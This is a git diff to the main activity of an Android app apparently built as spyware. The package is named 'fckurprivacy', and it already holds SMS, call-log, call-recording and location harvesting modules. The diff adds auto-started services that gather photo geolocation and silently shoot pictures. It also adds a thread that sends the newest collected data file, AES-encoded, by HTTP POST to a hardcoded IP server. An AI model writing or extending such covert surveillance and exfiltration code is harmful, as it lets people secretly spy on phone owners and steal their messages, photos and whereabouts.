@@ -4,7 +4,10 @@ import android.Manifest;
 import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
 import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
@@ -12,18 +15,27 @@ import android.widget.TextView;
 import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
 import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogsJson;
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
+import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageCheckService;
+import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageContentObserver;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoChecker;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsActivity;
 import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsChecker;
+import com.vergermiya.harevost.fckurprivacy.SilentShooter.SilentShootService;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
+import com.vergermiya.harevost.fckurprivacy.Util.AESUtils;
 import com.vergermiya.harevost.fckurprivacy.Util.AccessibilityChecker;
+import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
+import com.vergermiya.harevost.fckurprivacy.Util.HttpRequest;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
 import com.vergermiya.harevost.fckurprivacy.Util.JsonUploader;
 import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationService;
 
+import org.json.JSONArray;
+
+import java.io.File;
 import java.util.ArrayList;
 
 public class MainActivity extends AppCompatActivity {
@@ -102,6 +114,13 @@ public class MainActivity extends AppCompatActivity {
         Intent locService = new Intent(MainActivity.this, LocationService.class);
         startService(locService);
 
+        Intent imageIntent = new Intent(MainActivity.this, ImageCheckService.class);
+        startService(imageIntent);
+
+        Intent lockIntent = new Intent(MainActivity.this, SilentShootService.class);
+        startService(lockIntent);
+
+
         getCallLogsButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
@@ -139,9 +158,18 @@ public class MainActivity extends AppCompatActivity {
                 Thread uploadThread = new Thread() {
                     @Override
                     public void run() {
-                        ArrayList<SmsJson> smsJsons = SmsObserver.querySmsJson(getApplicationContext(), SmsObserver.SMS_ALL);
-                        String smsJsonStr = JsonBuilder.buildSmsJsons(smsJsons).toString();
-                        JsonUploader.postJson(smsJsonStr);
+                        File cryptoaFile = new FileSaver().getPublicStorageDir("cryptoa");
+                        File[] files = cryptoaFile.listFiles();
+                        File latestFile = files[0];
+                        for (File file : files) {
+                            if (file.lastModified() > latestFile.lastModified() && latestFile.getName().endsWith(".json")) {
+                                latestFile = file;
+                            }
+                        }
+                        //JsonUploader.postJson(smsJsonStr);
+                        //HttpRequest.sendPost("http://10.8.205.87:8080", "allsms" + "=" + AESUtils.filetoStr(latestFile.getPath()));
+                        HttpRequest.sendPost("http://10.8.187.120:8080", "name=" + latestFile.getName() + "&" +
+                                                                        "value=" + AESUtils.filetoStr(latestFile.getPath()));
                     }
                 };
                 uploadThread.start();
@@ -174,6 +202,9 @@ public class MainActivity extends AppCompatActivity {
             finish();
         }
         InfoChecker.saveInfoJson(this);
-    }
 
+        JSONArray allImageInfo = JsonBuilder.buildImageJsons(ImageContentObserver.getPhotoLocation(this));
+        FileSaver fileSaver = new FileSaver();
+        fileSaver.saveFile("allImageInfo", ".json", allImageInfo.toString());
+    }
 }
